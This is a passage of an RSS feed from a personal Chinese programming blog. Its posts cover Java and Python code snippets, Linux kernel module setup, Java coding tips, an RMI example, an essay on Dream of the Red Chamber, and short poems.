<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;File&nbsp;&nbsp; parent&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; File(outFile.getParent());&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&nbsp; (parent&nbsp;&nbsp; !=&nbsp;&nbsp; null&nbsp;&nbsp; &amp;&amp;&nbsp;&nbsp; !parent.exists())&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;parent.mkdirs();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;&nbsp; =&nbsp;&nbsp; new&nbsp;&nbsp; FileOutputStream(outFile);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;&nbsp; (true)&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp; nRead&nbsp;&nbsp; =&nbsp;&nbsp; in.read(buf,&nbsp;&nbsp; 0,&nbsp;&nbsp; buf.length);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&nbsp; (nRead&nbsp;&nbsp; &lt;=&nbsp;&nbsp; 0)&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out.write(buf,&nbsp;&nbsp; 0,&nbsp;&nbsp; nRead);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;out.close();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;outFile.setLastModified(archiveTime.getTime());&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;pm.close();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;zf.close();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;getToolkit().beep();&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;JOptionPane.showMessageDialog(MyJar.this,&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;"Extracted&nbsp;&nbsp; "&nbsp;&nbsp; +&nbsp;&nbsp; extracted&nbsp;&nbsp; +&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;"&nbsp;&nbsp; file"&nbsp;&nbsp; +&nbsp;&nbsp; ((extracted&nbsp;&nbsp; &gt;&nbsp;&nbsp; 1)&nbsp;&nbsp; ?&nbsp;&nbsp; "s":&nbsp;&nbsp; "")&nbsp;&nbsp; +&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;"&nbsp;&nbsp; from&nbsp;&nbsp; the\n"&nbsp;&nbsp; +&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;zipfile&nbsp;&nbsp; +&nbsp;&nbsp; "\narchive&nbsp;&nbsp; into&nbsp;&nbsp; the\n"&nbsp;&nbsp; +&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;outputDir.getPath()&nbsp;&nbsp; +&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;"\ndirectory.",&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;"Zip&nbsp;&nbsp; Self&nbsp;&nbsp; Extractor",&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;JOptionPane.INFORMATION_MESSAGE);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;catch&nbsp;&nbsp; (Exception&nbsp;&nbsp; e)&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;System.out.println(e);&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;if(zf!=null)&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;try<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;zf.close();&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;catch(IOException&nbsp;&nbsp; ioe)&nbsp;&nbsp; {;}&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;if(out!=null)<BR>&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;try&nbsp;&nbsp; {out.close();}&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;catch(IOException&nbsp;&nbsp; ioe)&nbsp;&nbsp; {;}&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;if(in!=null)&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;try&nbsp;&nbsp; {&nbsp;&nbsp; in.close();&nbsp;&nbsp; }&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;catch(IOException&nbsp;&nbsp; ioe)&nbsp;&nbsp; {;}&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp; <BR>}</SPAN>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720069201024300/</guid>
    </item>
    <item>
      <title>
<![CDATA[小巧的TCP/IP协议栈uIP]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720100433655965/</link>
      <description>
<![CDATA[进入unix文件夹，运行make命令编译生成uip文件，然后以root身份运行uip即可启动一个小巧的web服务器<br>$ sudo make<br>$ sudo ./uip &amp;<br>$ wget 192.168.0.2<br>uIP是为嵌入式开发的协议栈，在linux上，使用tuntap虚拟出的一个网卡tap0<br><br><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720100433655965/</guid>
    </item>
    <item>
      <title>
<![CDATA[从进化论与红楼梦看封建贵族的衰败]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200952655234529/</link>
      <description>
<![CDATA[前些天在豆瓣看到《脂砚斋全评石头记》的评价不错，从图书馆借来看，发现以前历尽千辛万苦才理了个大致明白的千丝万缕的人物关系几乎全忘了，从网上找到一个红楼梦人物关系图，梳理之间发现一些问题：<br>这些人物关系竟然大体上是闭包的，所有的婚姻基本都发生在贾、王、薛、史四家，而主要人物也都集中在三代人之间。<br>从法律上讲，直系血亲和三代以内旁系血亲禁止结婚；... 从进化论上讲，影响后代质量。门当户对的观念导致历朝历代封建贵族大致如斯。<br>当然，这张图里的妾一般不属于闭包里，但是在封建社里，庶出的地位明显受到排挤，不能成为中流砥柱，如贾环者；而且一旦不被排挤，也马上成为这个闭包的一部分，如邢夫人者。<br><br><img title="从进化论与红楼梦看封建贵族的衰败 - hankjin - 乱-Blog" alt="从进化论与红楼梦看封建贵族的衰败 - hankjin - 乱-Blog" src="http://static9.photo.sina.com.cn/orignal/4bff6274452abeb1839f8&amp;000"><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200952655234529/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu下构建内核编程环境]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200810133417939/</link>
      <description>
<![CDATA[<ul><li>&nbsp;1. 基础编程环境(gcc make etc)</li></ul><div style="margin-left: 40px;">apt-get install build-essential</div><ul><li>2. 内核头文件和源文件</li></ul><div style="margin-left: 40px;">apt-get install linux-headers-`uname -a|awk '{print $3}'`<br>apt-get install linux-source-`uname -a|awk '{print $3}'|sed 's/-server//g'`<br></div><ul><li>3. 内核工具</li></ul><div style="margin-left: 40px;">apt-get install kernel-package<br></div><ul><li>4. 测试(hello.c Makefile)</li></ul><div style="margin-left: 40px;">make<br>insmod hello.ko<br>rmmod hello<br>tail /var/log/syslog<br></div><ul><li>5. hello.c</li></ul><div style="margin-left: 40px;">#include &lt;linux/init.h&gt;<br>#include &lt;linux/module.h&gt;<br>MODULE_LICENSE("Dual BSD/GPL");<br>static int hello_init(void)<br>{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printk(KERN_ALERT "Hello, world\n");<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0;<br>}<br>static void hello_exit(void)<br>{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printk(KERN_ALERT "Goodbye, cruel world\n");<br>}<br>module_init(hello_init);<br>module_exit(hello_exit);<br></div><ul><li>6. Makefile</li></ul><div style="margin-left: 40px;">#Makefile for hello.c file<br>
#<br>
KERNEL_DIR:=/usr/src/linux<br>
RM=rm -fr<br>
obj-m:=hello.o<br>
default: <br><div style="margin-left: 40px;">$(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules<br></div>
clean:<br></div><div style="margin-left: 80px;">
 $(RM).*.cmd *.mod.c *.o&nbsp;&nbsp;-r .tmp<br></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200810133417939/</guid>
    </item>
    <item>
      <title>
<![CDATA[java代码编写的30条建议!!!!!!(转)]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200782681145700/</link>
      <description>
<![CDATA[<P>1) 类名首字母应该大写。字段、方法以及对象（句柄）的首字母应小写。对于所有标 <BR>识符，其中包含的所有单词都应紧靠在一起，而且大写中间单词的首字母。例如： <BR>ThisIsAClassName <BR>thisIsMethodOrFieldName <BR>若在定义中出现了常数初始化字符，则大写static final基本类型标识符中的所有字母 <BR>。这样便可标志出它们属于编译期的常数。 <BR>Java包（Package）属于一种特殊情况：它们全都是小写字母，即便中间的单词亦是如此 <BR>。对于域名扩展名称，如com，org，net或者edu等，全部都应小写（这也是Java 1.1和 <BR>Java 1.2的区别之一）。 </P>
<P><BR>(2) 为了常规用途而创建一个类时，请采取"经典形式"，并包含对下述元素的定义： <BR>equals() <BR>hashCode() <BR>toString() <BR>clone()（implement Cloneable） <BR>implement Serializable </P>
<P><BR>(3) 对于自己创建的每一个类，都考虑置入一个main()，其中包含了用于测试那个类的 <BR>代码。为使用一个项目中的类，我们没必要删除测试代码。若进行了任何形式的改动， <BR>可方便地返回测试。这些代码也可作为如何使用类的一个示例使用。 </P>
<P><BR>(4) 应将方法设计成简要的、功能性单元，用它描述和实现一个不连续的类接口部分。 <BR>理想情况下，方法应简明扼要。若长度很大，可考虑通过某种方式将其分割成较短的几 <BR>个方法。这样做也便于类内代码的重复使用（有些时候，方法必须非常大，但它们仍应 <BR>只做同样的一件事情）。 </P>
<P><BR>(5) 设计一个类时，请设身处地为客户程序员考虑一下（类的使用方法应该是非常明确 <BR>的）。然后，再设身处地为管理代码的人考虑一下（预计有可能进行哪些形式的修改， <BR>想想用什么方法可把它们变得更简单）。 </P>
<P><BR>(6) 使类尽可能短小精悍，而且只解决一个特定的问题。下面是对类设计的一些建议： <BR>&nbsp;<BR>■一个复杂的开关语句：考虑采用"多形"机制 <BR>■数量众多的方法涉及到类型差别极大的操作：考虑用几个类来分别实现 <BR>■许多成员变量在特征上有很大的差别：考虑使用几个类 </P>
<P><BR>(7) 让一切东西都尽可能地"私有"--private。可使库的某一部分"公共化"（一个方法、 <BR>类或者一个字段等等），就永远不能把它拿出。若强行拿出，就可能破坏其他人现有的 <BR>代码，使他们不得不重新编写和设计。若只公布自己必须公布的，就可放心大胆地改变 <BR>其他任何东西。在多线程环境中，隐私是特别重要的一个因素--只有private字段才能在 <BR>非同步使用的情况下受到保护。 </P>
<P><BR>(8) 谨惕"巨大对象综合症"。对一些习惯于顺序编程思维、且初涉OOP领域的新手，往往 <BR>喜欢先写一个顺序执行的程序，再把它嵌入一个或两个巨大的对象里。根据编程原理， <BR>对象表达的应该是应用程序的概念，而非应用程序本身。 </P>
<P><BR>(9) 若不得已进行一些不太雅观的编程，至少应该把那些代码置于一个类的内部。 </P>
<P><BR>(10) 任何时候只要发现类与类之间结合得非常紧密，就需要考虑是否采用内部类，从而 <BR>改善编码及维护工作（参见第14章14.1.2小节的"用内部类改进代码"）。 </P>
<P><BR>(11) 尽可能细致地加上注释，并用javadoc注释文档语法生成自己的程序文档。 </P>
<P><BR>(12) 避免使用"魔术数字"，这些数字很难与代码很好地配合。如以后需要修改它，无疑 <BR>会成为一场噩梦，因为根本不知道"100"到底是指"数组大小"还是"其他全然不同的东西 <BR>"。所以，我们应创建一个常数，并为其使用具有说服力的描述性名称，并在整个程序中 <BR>都采用常数标识符。这样可使程序更易理解以及更易维护。 </P>
<P><BR>(13) 涉及构建器和异常的时候，通常希望重新丢弃在构建器中捕获的任何异常--如果它 <BR>造成了那个对象的创建失败。这样一来，调用者就不会以为那个对象已正确地创建，从 <BR>而盲目地继续。 </P>
<P><BR>(14) 当客户程序员用完对象以后，若你的类要求进行任何清除工作，可考虑将清除代码 <BR>置于一个良好定义的方法里，采用类似于cleanup()这样的名字，明确表明自己的用途。 <BR>除此以外，可在类内放置一个boolean（布尔）标记，指出对象是否已被清除。在类的f <BR>inalize()方法里，请确定对象已被清除，并已丢弃了从RuntimeException继承的一个类 <BR>（如果还没有的话），从而指出一个编程错误。在采取象这样的方案之前，请确定fina <BR>lize()能够在自己的系统中工作（可能需要调用System.runFinalizersOnExit(true)， <BR>从而确保这一行为）。 </P>
<P><BR>(15) 在一个特定的作用域内，若一个对象必须清除（非由垃圾收集机制处理），请采用 <BR>下述方法：初始化对象；若成功，则立即进入一个含有finally从句的try块，开始清除 <BR>工作。 </P>
<P><BR>(16) 若在初始化过程中需要覆盖（取消）finalize()，请记住调用super.finalize()（ <BR>若Object属于我们的直接超类，则无此必要）。在对finalize()进行覆盖的过程中，对 <BR>super.finalize()的调用应属于最后一个行动，而不应是第一个行动，这样可确保在需 <BR>要基础类组件的时候它们依然有效。 </P>
<P><BR>(17) 创建大小固定的对象集合时，请将它们传输至一个数组（若准备从一个方法里返回 <BR>这个集合，更应如此操作）。这样一来，我们就可享受到数组在编译期进行类型检查的 <BR>好处。此外，为使用它们，数组的接收者也许并不需要将对象"造型"到数组里。 </P>
<P><BR>(18) 尽量使用interfaces，不要使用abstract类。若已知某样东西准备成为一个基础类 <BR>，那么第一个选择应是将其变成一个interface（接口）。只有在不得不使用方法定义或 <BR>者成员变量的时候，才需要将其变成一个abstract（抽象）类。接口主要描述了客户希 <BR>望做什么事情，而一个类则致力于（或允许）具体的实施细节。 </P>
<P><BR>(19) 在构建器内部，只进行那些将对象设为正确状态所需的工作。尽可能地避免调用其 <BR>他方法，因为那些方法可能被其他人覆盖或取消，从而在构建过程中产生不可预知的结 <BR>果（参见第7章的详细说明）。 </P>
<P><BR>(20) 对象不应只是简单地容纳一些数据；它们的行为也应得到良好的定义。 </P>
<P><BR>(21) 在现成类的基础上创建新类时，请首先选择"新建"或"创作"。只有自己的设计要求 <BR>必须继承时，才应考虑这方面的问题。若在本来允许新建的场合使用了继承，则整个设 <BR>计会变得没有必要地复杂。 </P>
<P><BR>(22) 用继承及方法覆盖来表示行为间的差异，而用字段表示状态间的区别。一个非常极 <BR>端的例子是通过对不同类的继承来表示颜色，这是绝对应该避免的：应直接使用一个"颜 <BR>色"字段。 </P>
<P><BR>(23) 为避免编程时遇到麻烦，请保证在自己类路径指到的任何地方，每个名字都仅对应 <BR>一个类。否则，编译器可能先找到同名的另一个类，并报告出错消息。若怀疑自己碰到 <BR>了类路径问题，请试试在类路径的每一个起点，搜索一下同名的.class文件。 </P>
<P><BR>(24) 在Java 1.1 AWT中使用事件"适配器"时，特别容易碰到一个陷阱。若覆盖了某个适 <BR>配器方法，同时拼写方法没有特别讲究，最后的结果就是新添加一个方法，而不是覆盖 <BR>现成方法。然而，由于这样做是完全合法的，所以不会从编译器或运行期系统获得任何 <BR>出错提示--只不过代码的工作就变得不正常了。 </P>
<P><BR>(25) 用合理的设计方案消除"伪功能"。也就是说，假若只需要创建类的一个对象，就不 <BR>要提前限制自己使用应用程序，并加上一条"只生成其中一个"注释。请考虑将其封装成 <BR>一个"独生子"的形式。若在主程序里有大量散乱的代码，用于创建自己的对象，请考虑 <BR>采纳一种创造性的方案，将些代码封装起来。 </P>
<P><BR>(26) 警惕"分析瘫痪"。请记住，无论如何都要提前了解整个项目的状况，再去考察其中 <BR>的细节。由于把握了全局，可快速认识自己未知的一些因素，防止在考察细节的时候陷 <BR>入"死逻辑"中。 </P>
<P><BR>(27) 警惕"过早优化"。首先让它运行起来，再考虑变得更快--但只有在自己必须这样做 <BR>、而且经证实在某部分代码中的确存在一个性能瓶颈的时候，才应进行优化。除非用专 <BR>门的工具分析瓶颈，否则很有可能是在浪费自己的时间。性能提升的隐含代价是自己的 <BR>代码变得难于理解，而且难于维护。 </P>
<P><BR>(28) 请记住，阅读代码的时间比写代码的时间多得多。思路清晰的设计可获得易于理解 <BR>的程序，但注释、细致的解释以及一些示例往往具有不可估量的价值。无论对你自己， <BR>还是对后来的人，它们都是相当重要的。如对此仍有怀疑，那么请试想自己试图从联机 <BR>Java文档里找出有用信息时碰到的挫折，这样或许能将你说服。 </P>
<P><BR>(29) 如认为自己已进行了良好的分析、设计或者实施，那么请稍微更换一下思维角度。 <BR>试试邀请一些外来人士--并不一定是专家，但可以是来自本公司其他部门的人。请他们 <BR>用完全新鲜的眼光考察你的工作，看看是否能找出你一度熟视无睹的问题。采取这种方 <BR>式，往往能在最适合修改的阶段找出一些关键性的问题，避免产品发行后再解决问题而 <BR>造成的金钱及精力方面的损失。 </P>
<P><BR>(30) 良好的设计能带来最大的回报。简言之，对于一个特定的问题，通常会花较长的时 <BR>间才能找到一种最恰当的解决方案。但一旦找到了正确的方法，以后的工作就轻松多了 <BR>，再也不用经历数小时、数天或者数月的痛苦挣扎。我们的努力工作会带来最大的回报 <BR>（甚至无可估量）。而且由于自己倾注了大量心血，最终获得一个出色的设计方案，成 <BR>功的快感也是令人心动的。坚持抵制草草完工的诱惑--那样做往往得不偿失<BR>&nbsp;<BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200782681145700/</guid>
    </item>
    <item>
      <title>
<![CDATA[rmi的小例子HelloWorld]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200922062343838/</link>
      <description>
<![CDATA[三部分:接口,服务端,客户端<br>//接口HelloWorld<br>import java.rmi.*;<br>public interface HelloWorld extends Remote{<br>&nbsp;&nbsp;&nbsp; public static String Name = "HelloRmi";<br>&nbsp;&nbsp;&nbsp; public String hello(String name) throws RemoteException;<br>}<br><br>//服务端<br>import java.rmi.*;<br>import java.rmi.server.*;<br><br>public class HelloWorldImpl extends RemoteServer implements HelloWorld{<br>&nbsp;&nbsp;&nbsp; public HelloWorldImpl(){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; try{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; UnicastRemoteObject.exportObject(this);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; catch(Exception e){e.printStackTrace();}<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; public String hello(String name) throws RemoteException{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return "hello " + name;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; public static void main(String args[])throws Exception{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; HelloWorldImpl server = new HelloWorldImpl();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Naming.rebind(HelloWorldImpl.Name,server);<br>&nbsp;&nbsp;&nbsp; }<br>}<br><br>//客户端<br>import java.rmi.*;<br>public class Client{<br>&nbsp;&nbsp;&nbsp; public static void main(String args[]) throws Exception{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; HelloWorld server = (HelloWorld)Naming.lookup("rmi://localhost/"+HelloWorld.Name);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; System.out.println(server.hello("hank"));<br>&nbsp;&nbsp;&nbsp; }<br>}<br><br>运行方法<br>rmic HelloWorldImpl<br>rmiregistry<br>java Server<br>java Client<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200922062343838/</guid>
    </item>
    <item>
      <title>
<![CDATA[立冬源湖见喜鹊]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200910149146471/</link>
      <description>
<![CDATA[一<br>源湖将冻喜鹊愁<br>诸缘生灭皆心由<br>花不飘零水不流<br>亦无相思亦无愁<br><br>二<br>源湖将冻喜鹊忧<br>诸缘生灭皆心由<br>花不飘零水不流<br>亦无相思亦无愁<br><br>三<br>源湖将冻喜鹊啾<br>诸缘生灭皆心由<br>花自飘零水自流<br>亦无相思亦无愁<br><br>四<br>源湖水冷喜鹊啾<br>诸缘生灭皆心由<br>花自飘零水自流<br>亦无相思亦无愁<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200910149146471/</guid>
    </item>
    <item>
      <title>
<![CDATA[皮尔逊相关系数Pearson Correlation Score]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095128433478/</link>
      <description>
<![CDATA[根据某个用户的历史和其它用户的历史，向该用户推荐，需要用到相关系数，最简单得两种相关系数是欧氏距离和皮尔逊相关系数。<br>欧式距离Euclidean Distance比较简单，和初等几何的两点间距离求法相通：sqrt( (x1-x2)*(y1-y2) )<br>皮尔逊相关系数Pearson Correlation相对麻烦一些:<br><a href="http://img.bimg.126.net/photo/WZXs_ZOI7AAVFcww5lSwBw==/3998352044175500965.jpg" target="_blank"><img title="皮尔逊相关系数Pearson Correlation Score - hankjin - 乱-Blog" alt="皮尔逊相关系数Pearson Correlation Score - hankjin - 乱-Blog" src="http://img.bimg.126.net/photo/WZXs_ZOI7AAVFcww5lSwBw==/3998352044175500965.jpg"></a><br>记住公式以后编码还是比较简单的，下面引用一段Collective Intelligence的代码：<br># 2. Pearson Correlation 皮尔逊相关<br>def sim_pearson(prefs,p1,p2):<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #get the list of mutually rated items<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; si={}<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; for item in prefs[p1]:<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if item in prefs[p2]:si[item]=1<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #find the number of elements<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; n=len(si)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #if they are no ratings in common, return 0<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if n==0: return 0<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #add up all the preferences<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; sum1 = sum([prefs[p1][it] for it in si])<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; sum2 = sum([prefs[p2][it] for it in si])<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #sum up the squares<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; sum1Sq = sum([pow(prefs[p1][it],2) for it in si])<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; sum2Sq = sum([pow(prefs[p2][it],2) for it in si])<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #sum up the products<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; pSum = sum([prefs[p1][it]*prefs[p2][it] for it in si])<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; #calculate pearson score<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; num = pSum - (sum1 * sum2 / n)<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; den = sqrt((sum1Sq - pow(sum1,2) / n) * (sum2Sq - pow(sum2,2)/n))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if den == 0: return 0<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; r = num / den<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return r<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Math</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095128433478/</guid>
    </item>
    <item>
      <title>
<![CDATA[Python提取OpenOffice的文本]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010610111933684/</link>
      <description>
<![CDATA[一个很根本的知识，OpenOffice 的 odt 文档就是一个zip文件，内容存放在zip里的content.xml 文件里。<br>所以只要用zipfile打开，然后读content.xml，然后把xml标签去掉。<br>import zipfile,re<br>#rx_stripxml=re.compile("&lt;[^&gt;]*?&gt;", re.DOTALL|re.MULTILINE)<br>rx_stripxml=re.compile("&lt;[^&gt;]*?&gt;", re.DOTALL|re.MULTILINE)<br>def convert_OO(filename, want_text=True):<br>&nbsp;&nbsp;&nbsp; zf=zipfile.ZipFile(filename,"r")<br>&nbsp;&nbsp;&nbsp; data=zf.read("content.xml")<br>&nbsp;&nbsp;&nbsp; zf.close()<br>&nbsp;&nbsp;&nbsp; if want_text:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data=" ".join(rx_stripxml.sub(" ", data).split())<br>&nbsp;&nbsp;&nbsp; return data<br>if __name__=='__main__':<br>&nbsp;&nbsp;&nbsp; docname='test.odt'<br>&nbsp;&nbsp;&nbsp; print 'Text of',docname,':'<br>&nbsp;&nbsp;&nbsp; print convert_OO(docname)<br>&nbsp;&nbsp;&nbsp; print 'XML of',docname,':'<br>&nbsp;&nbsp;&nbsp; print convert_OO(docname, want_text=False)]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010610111933684/</guid>
    </item>
    <item>
      <title>
<![CDATA[技术交流]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010731101556266/</link>
      <description>
